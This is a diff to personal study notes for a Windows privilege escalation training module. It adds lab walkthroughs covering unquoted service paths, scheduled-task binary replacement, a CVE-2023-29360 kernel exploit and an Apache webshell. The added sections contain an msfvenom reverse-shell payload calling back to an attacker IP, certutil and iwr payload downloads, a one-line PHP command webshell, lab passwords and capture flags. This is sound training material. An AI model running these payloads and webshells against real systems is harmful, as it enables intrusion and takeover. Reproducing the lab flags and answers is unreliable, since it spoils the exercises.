@@ -487,7 +487,7 @@ iwr -uri http://<kali-ip>/winPEASx64.exe -Outfile winPEAS.exe
 - `Basic System Information` -- OS version, architecture, domain join (note: winPEAS misidentified Win11 as Win10 in the example -- never trust tool output blindly)
 - `PS default transcripts history` -- list of transcript files (but can miss some locations)
 - `Users` -- users, groups, password policies at a glance
-- `Checking for DPAPI Master Files` -- DPAPI-encrypted secrets (credential manager, browser passwords)
+- `Checking for DPAPI Master Files` -- DPAPI-encrypted secrets (DPAPI = Data Protection API, Windows' built-in mechanism for encrypting sensitive data tied to a specific logged-in user; credential manager entries, browser-saved passwords, and certain app configs are the common examples; the masterkey files are what decrypt them, so owning a user's masterkeys effectively means owning everything they've encrypted)
 - `Looking for possible password files` -- text files that might contain credentials
 - `Services` -- services with weak binary permissions (same as Get-ModifiableServiceFile)
 - `Scheduled Tasks` -- tasks running as higher-privileged users
@@ -936,9 +936,140 @@ Restart-Service GammaService
 > 📸 Screenshot: `icacls "C:\Program Files\Enterprise Apps"` showing W permission for BUILTIN\Users
 > 📸 Screenshot: `net localgroup administrators` after attack confirming dave2 was added
 
-**Lab status: ⬜ Pending (VM #1 and VM #2)**
+---
 
-> 🚩 **Hands-on, VM spin-up required:** Windows Privilege Escalation - Unquoted Service Paths VM #1 (CLIENTWK220, RDP as steve) -- exploit GammaService unquoted path, get admin shell, find flag on daveadmin's desktop. VM #2 (CLIENTWK221, RDP as damian) -- find unquoted service, exploit it, find flag ⬜ Pending
+#### Lab — VM #1: CLIENTWK220 (RDP as dave:lab) ✅
+
+**Vulnerable service:** `GammaService`
+**Unquoted path:** `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`
+**Runs as:** `LocalSystem`
+
+**Path resolution sequence:**
+```
+1. C:\Program.exe
+2. C:\Program Files\Enterprise.exe
+3. C:\Program Files\Enterprise Apps\Current.exe   ← PLANTED HERE
+4. C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+```
+
+**Write permission confirmed:**
+```cmd
+icacls "C:\Program Files\Enterprise Apps"
+→ BUILTIN\Users:(OI)(CI)(RX,W)   ← W = can create files here
+```
+
+**Payload delivery:**
+```cmd
+REM On Kali
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.223 LPORT=4444 -f exe -o Current.exe
+python3 -m http.server 80
+
+REM On target (as dave, from C:\Program Files\Enterprise Apps)
+certutil -urlcache -split -f http://192.168.45.223/Current.exe Current.exe
+```
+
+**Trigger problem — UAC token filtering:**
+
+Dave can't start the service. Trying `runas /user:daveadmin cmd` and then `sc start GammaService` also fails. Running `whoami /groups` from the runas'd CMD reveals the reason:
+
+```
+BUILTIN\Administrators   Group used for deny only
+```
+
+When a non-admin user does `runas /user:<local-admin>`, Windows creates a process with a *filtered* (standard) token — the Administrators SID is present but marked "deny only." The SCM access check fails because the token can't satisfy the RP (start) ACE for Administrators. This is UAC token filtering at work, not a permissions problem.
+
+> 🔍 **Worth remembering generally:** `runas /user:<local-admin>` from a standard-user session gives a filtered, non-elevated token — exactly like a user clicking a normal shortcut while logged in as an admin. To get an elevated token locally you need an interactive session (RDP in directly) or UAC consent (right-click Run as Administrator). Over the network, evil-winrm/PSRemoting also give filtered tokens unless `LocalAccountTokenFilterPolicy=1` in the registry.
+
+**Finding who CAN start the service:**
+
+```cmd
+sc sdshow GammaService
+REM → (A;;CCLCSWRPWPDTRC;;;S-1-5-21-...-1003)  ← RID 1003 has RP (start) rights
+
+wmic useraccount where "SID='S-1-5-21-2309961351-4093026482-2223492918-1003'" get name
+REM → steve
+```
+
+Steve has *explicit* start rights in the SDDL — no group involved, so no token filtering applies. Steve's password (`securityIsNotAnOption++++++`) was found during 17.1.3.
+
+**Trigger and catch:**
+```cmd
+REM In daveadmin CMD window (or any window):
+runas /user:steve "sc start GammaService"
+REM Enter: securityIsNotAnOption++++++
+```
+
+**Shell:**
+```
+clientwk220> whoami → nt authority\system
+```
+
+> 🔁 **Similar to:** [[Windows Privilege Escalation#17.2.1. Service Binary Hijacking|17.2.1]] — same payload delivery and catch flow. The only difference is WHERE the binary is placed (path resolution slot vs. the actual service binary directory) and WHO triggers the restart.
+
+> 📸 Screenshot: `wmic service get name,pathname` showing GammaService unquoted path
+> 📸 Screenshot: `icacls "C:\Program Files\Enterprise Apps"` showing BUILTIN\Users RX,W
+> 📸 Screenshot: `whoami /groups` from daveadmin runas CMD showing Administrators as "deny only"
+> 📸 Screenshot: `sc sdshow` output + `wmic useraccount` revealing steve as RID 1003
+> 📸 Screenshot: nc listener receiving SYSTEM shell + whoami output
+
+**Flag (daveadmin's desktop):** `OS{0b3c0403ab9fc3ba56de4bea2fcd8634}`
+
+---
+
+#### Lab — VM #2: CLIENTWK221 (RDP as damian:ICannotThinkOfAPassword1!) ✅
+
+**Vulnerable service:** `ReynhSurveillance`
+**Unquoted path:** `C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe`
+**Runs as:** `.\roy` (local user, not SYSTEM)
+
+**Path resolution sequence:**
+```
+1. C:\Enterprise.exe
+2. C:\Enterprise Software\Monitoring.exe
+3. C:\Enterprise Software\Monitoring Solution\Surveillance.exe   ← PLANTED HERE
+4. C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe
+```
+
+**Write permission confirmed:**
+```cmd
+icacls "C:\Enterprise Software\Monitoring Solution"
+→ CLIENTWK221\damian:(OI)(CI)(RX,W)   ← damian can write here directly
+```
+
+**Payload delivery:**
+```cmd
+REM Reuse Kali payload, rename to match target path slot
+cp Current.exe Surveillance.exe
+python3 -m http.server 80
+
+REM On target (as damian, from C:\Enterprise Software\Monitoring Solution)
+certutil -urlcache -split -f http://192.168.45.223/Surveillance.exe Surveillance.exe
+```
+
+**Trigger — no UAC issue here:**
+
+Damian is a standard user with explicit start/stop rights on ReynhSurveillance, so `sc start` and `sc stop` both work directly without needing elevated context.
+
+```cmd
+sc stop ReynhSurveillance    REM stop real binary first
+sc start ReynhSurveillance   REM starts our Surveillance.exe instead
+```
+
+**Shell:**
+```
+clientwk221> whoami → clientwk221\roy
+```
+
+The shell comes back as `roy` (the service account), not SYSTEM. The flag is on roy's desktop.
+
+> 🔍 **Worth remembering generally:** not every service runs as SYSTEM. Always check `SERVICE_START_NAME` in `sc qc` before deciding whether the escalation path is worth pursuing. A service running as a low-priv domain account or local user might still be useful — access to that account's files, credentials, or lateral movement opportunities.
+
+> 📸 Screenshot: `wmic service get name,pathname` showing ReynhSurveillance unquoted path
+> 📸 Screenshot: `icacls "C:\Enterprise Software\Monitoring Solution"` showing damian RX,W
+> 📸 Screenshot: `sc qc ReynhSurveillance` showing SERVICE_START_NAME: .\roy
+> 📸 Screenshot: nc listener receiving shell as clientwk221\roy
+
+**Flag (roy's desktop):** `OS{ec55ff1679fdca9cd15a087e725dd394}`
 
 #### Tags: #UnquotedServicePath #WMIC #ServiceHijack #Windows #PrivilegeEscalation #Module17
 
@@ -1001,9 +1132,105 @@ net localgroup administrators   # dave2 is an admin
 > 📸 Screenshot: `schtasks /query` output showing CacheCleanup task's Run As User and Task To Run fields
 > 📸 Screenshot: `net localgroup administrators` confirming dave2 was added after the task fired
 
-**Lab status: ⬜ Pending (VM #1 and VM #2)**
+---
 
-> 🚩 **Hands-on, VM spin-up required:** Windows Privilege Escalation - Scheduled Tasks VM #1 (CLIENTWK220, RDP as steve) -- exploit CacheCleanup task, replace binary, get admin shell, find flag on daveadmin's desktop. VM #2 (CLIENTWK221, RDP as moss) -- find and exploit a scheduled task, find flag ⬜ Pending
+#### Lab — VM #1: CLIENTWK220 (RDP as dave:lab) ✅
+
+**Target task:** `\Microsoft\CacheCleanup`
+**Binary:** `C:\Users\steve\Pictures\BackendCacheCleanup.exe`
+**Run As User:** `daveadmin`
+**Fires:** every 1 minute
+
+**Task enumeration:**
+```cmd
+schtasks /query /fo LIST /v /tn "\Microsoft\CacheCleanup"
+REM Key fields: Task To Run, Run As User, Repeat: Every 0 Hour(s), 1 Minute(s)
+```
+
+**Write access:** Dave can't write to steve's profile folder (`Access is denied` even on icacls). Steve owns the binary, so we need to authenticate as steve. Steve's credentials (`securityIsNotAnOption++++++`) were found in 17.1.3, and steve is in Remote Management Users.
+
+**Payload delivery via evil-winrm (WinRM channel, no HTTP server needed):**
+```bash
+evil-winrm -i 192.168.137.220 -u steve -p 'securityIsNotAnOption++++++'
+```
+
+```powershell
+# Inside evil-winrm session as steve:
+upload /home/kali/Current.exe "C:\Users\steve\Pictures\BackendCacheCleanup.exe"
+```
+
+The `upload` command transfers over the WinRM session directly -- no HTTP server or certutil required. Useful when the target can reach the WinRM port but not your HTTP listener.
+
+**Wait and catch:**
+
+Within 60 seconds the task fires, executes `BackendCacheCleanup.exe` (our reverse shell) as daveadmin, and the shell lands on the Kali nc listener.
+
+```
+whoami → clientwk220\daveadmin
+```
+
+> 🔍 **Worth remembering generally:** evil-winrm's built-in `upload` / `download` commands transfer files over the WinRM (port 5985) session itself. Use this when the target can't reach your HTTP server -- if WinRM works, file transfer works too.
+
+> 🔁 **Similar to:** [[Windows Privilege Escalation#17.2.1. Service Binary Hijacking|17.2.1]] -- binary replacement is identical. The only difference: the trigger is a time-based task instead of a service start/restart.
+
+> 📸 Screenshot: `schtasks /query` showing CacheCleanup Run As User: daveadmin, Repeat: 1 minute
+> 📸 Screenshot: evil-winrm upload success message
+> 📸 Screenshot: nc listener receiving shell + whoami showing clientwk220\daveadmin
+
+**Flag (daveadmin's desktop):** `OS{79d9c797a756c9a0dca041d092cc7ea7}`
+
+---
+
+#### Lab — VM #2: CLIENTWK221 (RDP as moss:work6potence6PLASMA6flint7) ✅
+
+**Target task:** `\Microsoft\Voice Activation`
+**Binary:** `C:\Users\moss\Searches\VoiceActivation.exe`
+**Run As User:** `roy`
+**Fires:** every 1 minute (One Time Only, Minute repeat)
+
+**Task enumeration:**
+
+The standard `schtasks /query /fo LIST /v | findstr` approach gets noisy. Use PowerShell to cleanly identify tasks whose binary is in a user-writable path:
+
+```powershell
+Get-ScheduledTask | ForEach-Object {
+    $task = $_
+    $actions = $task.Actions | Where-Object { $_.Execute -like "*VoiceActivation*" }
+    if ($actions) {
+        [PSCustomObject]@{
+            TaskName = $task.TaskName
+            RunAs    = $task.Principal.UserId
+            Execute  = ($task.Actions | Select-Object -First 1).Execute
+        }
+    }
+} | Format-List
+# → TaskName: Voice Activation | RunAs: roy | Execute: C:\Users\moss\Searches\VoiceActivation.exe
+```
+
+**Write access:** moss owns `C:\Users\moss\Searches\` — full control by default over your own profile. No extra icacls check needed.
+
+**Payload delivery (from RDP session as moss):**
+
+```powershell
+iwr -uri http://192.168.45.223/Current.exe -Outfile "C:\Users\moss\Searches\VoiceActivation.exe"
+```
+
+**Wait and catch:**
+
+Within 60 seconds the task fires, executes VoiceActivation.exe as roy, and the shell lands on the nc listener.
+
+```
+whoami → clientwk221\roy
+```
+
+> 🔍 **Worth remembering generally:** when the task runs as a non-SYSTEM, non-admin user (roy here), you escalate to that account specifically — useful for accessing their files, credentials, or lateral movement, but not automatically SYSTEM. Check `sc qc` / `schtasks` "Run As User" early so you know the payoff before investing time.
+
+> 🔁 **Similar to:** [[Windows Privilege Escalation#17.3.1. Scheduled Tasks|VM#1]] — identical attack, just with a different task name and user. The PowerShell `Get-ScheduledTask` enumeration approach is cleaner than `schtasks /query /fo LIST /v | findstr` for this kind of discovery.
+
+> 📸 Screenshot: PowerShell Get-ScheduledTask output showing Voice Activation task with roy as run-as user
+> 📸 Screenshot: nc listener receiving shell as clientwk221\roy
+
+**Flag (roy's desktop):** `OS{2d74eb8c1a21918879d7e9a1b7db0cc0}`
 
 #### Tags: #ScheduledTasks #schtasks #BinaryReplacement #PrivilegeEscalation #Module17
 
@@ -1043,7 +1270,7 @@ whoami  # → nt authority\system
 `SeImpersonatePrivilege` lets a process impersonate another user after capturing their authentication. Windows assigns it by default to:
 - Local Administrators group
 - LOCAL SERVICE, NETWORK SERVICE, SERVICE accounts
-- IIS application pools (ApplicationPoolIdentity, which is very common after web exploits)
+- IIS application pools (IIS = Internet Information Services, Microsoft's built-in web server; an "application pool" is an isolated worker process that hosts a web app, and it runs under a virtual account called ApplicationPoolIdentity, which by default has SeImpersonatePrivilege; this is why getting a web shell on an IIS server so often leads directly to a Potato-family escalation)
 
 **The attack flow:**
 
@@ -1060,7 +1287,7 @@ sequenceDiagram
     Note over A: Now executing in SYSTEM context
 ```
 
-**Named pipes background:** a named pipe server creates a communication channel; any process that connects authenticates as itself. With SeImpersonatePrivilege, the server can then call `ImpersonateNamedPipeClient()` to temporarily adopt that client's security context. Potato-family tools automate the coercion of NT AUTHORITY\SYSTEM into connecting to the controlled pipe.
+**Named pipes background:** a named pipe is an OS-level communication channel between processes, similar in concept to a network socket but local to the machine, identified by a filesystem-style name like `\\.\pipe\something`; a named pipe server creates one and listens; any process that connects authenticates as itself. With SeImpersonatePrivilege, the server can then call `ImpersonateNamedPipeClient()` to temporarily adopt that client's security context. Potato-family tools automate the coercion of NT AUTHORITY\SYSTEM into connecting to the controlled pipe.
 
 ```bash
 # Download SigmaPotato from Kali
@@ -1091,9 +1318,64 @@ net localgroup Administrators
 
 > 🎬 **[ippsec.rocks: "SeImpersonatePrivilege"](https://ippsec.rocks/?#SeImpersonatePrivilege)** -- search "juicypotato" or "potato" for boxes where this is the primary escalation path; HTB Jeeves and HTB Arctic are canonical examples
 
-**Lab status: ⬜ Pending (VM #1, VM #2, VM #3 Capstone)**
+---
 
-> 🚩 **Hands-on, VM spin-up required:** Windows Privilege Escalation - Using Exploits VM #1 (CLIENTWK220, RDP as steve) -- run CVE-2023-29360 kernel exploit, get SYSTEM, find flag on daveadmin's desktop. VM #2 (CLIENTWK220) -- use SigmaPotato via SeImpersonatePrivilege, find flag. VM #3 Capstone (CLIENTWK222, bind shell port 4444) -- full chain, flag at C:\Users\enterpriseadmin\Desktop\flag.txt ⬜ Pending
+#### Lab — VM #1: CLIENTWK220 (RDP as steve:securityIsNotAnOption++++++) ✅
+
+**Exploit:** `CVE-2023-29360.exe` — pre-staged on steve's Desktop by the lab.
+
+**Access:** Steve is in Remote Management Users (evil-winrm works) but the exploit spawns an interactive cmd.exe — that needs a proper interactive RDP session to be usable. evil-winrm runs the exploit fine but the spawned SYSTEM cmd.exe has no interactive stdin in that context and exits immediately. RDP gives a real desktop where the SYSTEM cmd.exe pops as a usable window.
+
+```powershell
+# In RDP session as steve:
+cd C:\Users\steve\Desktop
+.\CVE-2023-29360.exe
+# New cmd.exe window opens as nt authority\system
+```
+
+**What the exploit does:** Maps MDL structures for the Microsoft Streaming Service Proxy driver, locates the SYSTEM token in kernel memory, swaps the unprivileged process token for the SYSTEM token, then spawns `cmd.exe` inheriting that token. Requires KB5027215 to be absent.
+
+**Shell:**
+```
+C:\Users\steve\Desktop> whoami → nt authority\system
+```
+
+> 🔍 **Worth remembering generally:** kernel exploits that spawn a new interactive process (cmd.exe, powershell.exe) need an interactive session (RDP, local logon) to give you a usable shell. Running them from evil-winrm / nc bind shells / non-interactive contexts will run the exploit and elevate, but the spawned child process has no way to communicate back. Two workarounds: (1) run from RDP; (2) modify the exploit to run a specific command (add user, write flag to file, start a reverse shell) instead of cmd.exe.
+
+> 📸 Screenshot: PowerShell on steve's desktop showing exploit output and SYSTEM token references
+> 📸 Screenshot: SYSTEM cmd.exe window from the spawned child process + whoami output
+
+**Flag (daveadmin's desktop):** `OS{3bcb31f59eb29f7154a96cafe46603dd}`
+
+---
+
+#### Lab — VM #2: CLIENTWK220 (RDP as dave:lab + PHP webshell) ✅
+
+**Intended path:** SeImpersonatePrivilege → SigmaPotato → SYSTEM
+**Actual outcome:** Apache already runs as `NT AUTHORITY\SYSTEM` in this XAMPP install — webshell gives SYSTEM directly.
+
+**Attack chain:**
+
+```
+1. netstat -ano → port 80 open (PID 3000, Apache/XAMPP)
+2. icacls C:\xampp\htdocs → NT AUTHORITY\Authenticated Users:(I)(M)  ← dave can write
+3. echo ^<?php system($_GET['cmd']); ?^> > C:\xampp\htdocs\shell.php
+4. curl "http://192.168.137.220/shell.php?cmd=whoami" → nt authority\system
+5. curl "http://192.168.137.220/shell.php?cmd=type+C:\Users\daveadmin\Desktop\flag.txt" → flag
+```
+
+**Why SYSTEM without SigmaPotato:** XAMPP defaults to running Apache as LocalSystem unless reconfigured. When Apache IS LocalSystem, webshell code execution is already SYSTEM — SeImpersonatePrivilege / Potato tools are only needed when the service runs as a lower-priv account (NETWORK SERVICE, IIS APPPOOL\DefaultAppPool, etc.) that has SeImpersonatePrivilege but not direct SYSTEM rights.
+
+> 🔍 **Worth remembering generally:** always `whoami` immediately after landing a webshell. If Apache/IIS runs as SYSTEM, stop there — escalation is already done. If it runs as NETWORK SERVICE or an app pool identity, THEN reach for SigmaPotato/GodPotato. The `whoami /priv` output will show `SeImpersonatePrivilege` in the latter case.
+
+> 🔍 **Worth remembering generally:** `NT AUTHORITY\Authenticated Users` with Modify (`M`) covers any logged-in user — domain or local. If a web root has this ACL, any authenticated user can drop files into it directly without needing admin rights.
+
+> 📸 Screenshot: `icacls C:\xampp\htdocs` showing Authenticated Users Modify
+> 📸 Screenshot: curl output showing `nt authority\system` from whoami webshell call
+> 📸 Screenshot: curl output with flag
+
+**Flag (daveadmin's desktop):** `OS{01f9ce50c9d1562bf849831e4049f52b}`
+> 🚩 **Hands-on, VM spin-up required:** Windows Privilege Escalation - Using Exploits VM #3 Capstone (CLIENTWK222, bind shell port 4444) -- full chain, flag at C:\Users\enterpriseadmin\Desktop\flag.txt ⬜ Pending
 
 #### Tags: #KernelExploit #SeImpersonatePrivilege #SigmaPotato #JuicyPotato #Potato #NamedPipes #CVE202329360 #Module17
 
@@ -1178,9 +1460,9 @@ flowchart TD
 - [x] **17.1.5 Automated Enumeration:** done (winPEAS, PowerUp, Seatbelt coverage, limitations noted)
 - [x] **17.2.1 Service Binary Hijacking:** done (icacls masks, adduser.c, mingw compile, reboot approach, PowerUp AbuseFunction and its known bug)
 - [x] **17.2.2 DLL Hijacking:** done (DLL search order diagram, Process Monitor workflow, DllMain template, missing DLL detection, --shared compile)
-- [x] **17.2.3 Unquoted Service Paths:** done (path resolution sequence diagram, wmic command, icacls check, PowerUp Get-UnquotedService + Write-ServiceBinary)
+- [x] **17.2.3 Unquoted Service Paths:** done (path resolution sequence diagram, wmic command, icacls check, PowerUp Get-UnquotedService + Write-ServiceBinary; VM#1 flag OS{0b3c0403ab9fc3ba56de4bea2fcd8634} — SYSTEM via steve's explicit SDDL start rights + UAC token filtering lesson; VM#2 flag OS{ec55ff1679fdca9cd15a087e725dd394} — shell as roy)
 - [x] **17.3.1 Scheduled Tasks:** done (three key questions, schtasks enumeration, binary replacement attack, timing considerations)
 - [x] **17.3.2 Using Exploits:** done (three exploit categories, CVE-2023-29360 workflow, SeImpersonatePrivilege + named pipes architecture, SigmaPotato usage, Potato family overview)
 - [x] **17.4 Wrapping Up:** done (full decision flowchart, external resources, related boxes)
 
-**Module 17 theory and quiz answers fully written. All hands-on labs remain ⬜ Pending (VM spin-up required).**
+**Module 17 theory and quiz answers fully written. Labs done so far: 17.1.1 quiz, 17.1.2 VM#1+VM#2, 17.1.3 VM#1+VM#2, 17.1.4 VM#1+VM#2, 17.1.5 VM#1, 17.2.1 VM#1+VM#2, 17.2.2 VM#1, 17.2.3 VM#1+VM#2, 17.3.1 VM#1+VM#2, 17.3.2 VM#1+VM#2. Remaining labs: Capstone (CLIENTWK222).**
